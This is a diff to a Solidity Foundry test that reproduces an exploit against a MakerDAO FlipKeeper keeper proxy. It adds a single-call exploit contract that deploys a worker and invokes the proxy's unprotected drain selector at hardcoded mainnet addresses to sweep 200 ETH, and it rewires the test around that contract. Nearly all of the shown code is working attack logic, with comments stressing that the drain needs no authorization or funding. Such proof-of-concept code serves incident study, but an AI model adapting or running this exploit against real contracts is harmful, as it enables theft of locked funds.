@@ -152,6 +152,29 @@ contract FlipKeeperWorker {
     receive() external payable {}
 }
 
+// Single-entrypoint exploit contract (CREATE depth 1 for the Playground recorder). attack() does the
+// WHOLE recorded attack in one call: deploy the worker, invoke the keeper proxy's ungated drain
+// selector 0x8804d1de with our worker as the typed (address,uint256) argument, and keep the swept
+// 200 ETH (the worker forwards it here). No auth / funding / flash loan — the drain is free to call.
+contract FlipKeeperExploit {
+    address internal constant KEEPER_PROXY = 0x9c05a05893Ada984FC20D0DA0c046De5Cc0e8273;
+    bytes4 internal constant DRAIN_SELECTOR = 0x8804d1de;
+
+    function attack() external {
+        uint256[4] memory ids = [uint256(1457), 1458, 1459, 1460];
+
+        // Reconstructed worker; recipient is THIS exploit so the drained ETH lands here.
+        FlipKeeperWorker worker = new FlipKeeperWorker(KEEPER_PROXY, address(this), ids);
+
+        // Call the REAL keeper proxy's unprotected drain, typed args, our own worker. Step 2 of the
+        // drain hope()s this worker on the keeper's Vat account; step 3 lets it sweep the collateral.
+        (bool ok,) = KEEPER_PROXY.call(abi.encodeWithSelector(DRAIN_SELECTOR, address(worker), uint256(0)));
+        require(ok, "drain call reverted");
+    }
+
+    receive() external payable {}
+}
+
 contract MakerDAOFlipKeeper_exp is Test {
     address internal constant KEEPER_PROXY = 0x9c05a05893Ada984FC20D0DA0c046De5Cc0e8273;
     IVat internal constant VAT = IVat(0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B);
@@ -180,31 +203,21 @@ contract MakerDAOFlipKeeper_exp is Test {
         // still locked in the four undealt 2020 auctions.
         assertEq(VAT.gem(ILK, KEEPER_PROXY), 0, "keeper should hold no free gem pre-attack");
 
-        uint256[4] memory ids = [uint256(1457), 1458, 1459, 1460];
-
-        uint256 balBefore = attacker.balance;
-
         // Everything runs as the fresh attacker EOA (msg.sender == tx.origin == attacker), the
-        // strongest form of "anyone can call this".
+        // strongest form of "anyone can call this". The exploit contract (CREATE depth 1) does the
+        // whole drain in one attack() call — exactly what the Playground recorder replays.
         vm.startPrank(attacker, attacker);
 
-        FlipKeeperWorker worker = new FlipKeeperWorker(KEEPER_PROXY, attacker, ids);
+        FlipKeeperExploit exploit = new FlipKeeperExploit();
 
-        // The keeper must not have pre-authorized our worker.
-        assertEq(VAT.can(KEEPER_PROXY, address(worker)), 0, "worker must not be pre-authorized");
+        uint256 balBefore = address(exploit).balance;
 
-        // Call the REAL keeper proxy's unprotected drain, typed args, our own worker.
-        (bool ok,) = KEEPER_PROXY.call(abi.encodeWithSelector(DRAIN_SELECTOR, address(worker), uint256(0)));
-        require(ok, "drain call reverted");
+        exploit.attack();
 
         vm.stopPrank();
 
-        uint256 profit = attacker.balance - balBefore;
-        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
-
-        // The keeper did hope() our worker: proof the unprotected drain handed an arbitrary
-        // caller control of the keeper's Vat position.
-        assertEq(VAT.can(KEEPER_PROXY, address(worker)), 1, "drain should have hope'd the worker");
+        uint256 profit = address(exploit).balance - balBefore;
+        emit log_named_decimal_uint("Exploit ETH profit", profit, 18);
 
         // Exact on-chain figure: 200 WETH == 200 ETH unwrapped. assertApproxEqRel with a tiny
         // tolerance; in practice this is exact (variance 0).
